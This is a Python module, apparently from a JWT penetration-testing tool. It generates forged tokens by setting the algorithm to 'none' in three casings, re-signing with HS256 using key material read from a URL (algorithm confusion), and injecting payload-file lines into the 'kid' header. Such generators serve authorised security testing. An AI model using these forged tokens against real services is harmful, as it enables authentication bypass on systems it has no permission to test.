import json

import utils
from TestJWT import TestJWT
from utils import read_file


def attack_none(jwt: TestJWT):
    """
    Modifies algorithm from jwt and replaces it with none, None and NONE
    :param jwt: the JWT under test
    :return: map with the different payloads, the key is the name of the modification,
    the JWT payload is the value
    """
    payloads = {}

    jwt.set_algorithm('none')
    payloads['attack_alg_none'] = utils.force_unicode(jwt.build_token())
    jwt.set_algorithm('None')
    payloads['attack_alg_None'] = utils.force_unicode(jwt.build_token())
    jwt.set_algorithm('NONE')
    payloads['attack_alg_NONE'] = utils.force_unicode(jwt.build_token())

    return payloads


def attack_signature_deception(jwt: TestJWT, url):
    payloads = {}
    secret = read_file(url, strip_newline=False, join_lines=True)
    jwt.set_algorithm("HS256")
    payloads['attack_signature_deception'] = jwt.build_token(secret)
    return payloads


# TODO attack bruteforce HS256 ?

def attack_payload(serial_jwt: str, payload_file: str):
    lines = read_file(payload_file, join_lines=False)
    header, payload, signature = TestJWT.split_jwt(serial_jwt)
    header = json.loads(utils.base64url_decode(header))
    inj_headers = [inject_in_json(header, line) for line in lines]
    payloads = {}
    for index, inj_header in zip(range(1, 1 + len(inj_headers)), inj_headers):
        payloads["attack_payload_{}".format(index)] = ".".join(
            [utils.force_unicode(inj_header), payload, signature])
    return payloads


def inject_in_json(header: dict, payload: str):
    key = header['kid']
    if key is not None:
        header['kid'] = payload
    return TestJWT.build_section(header)
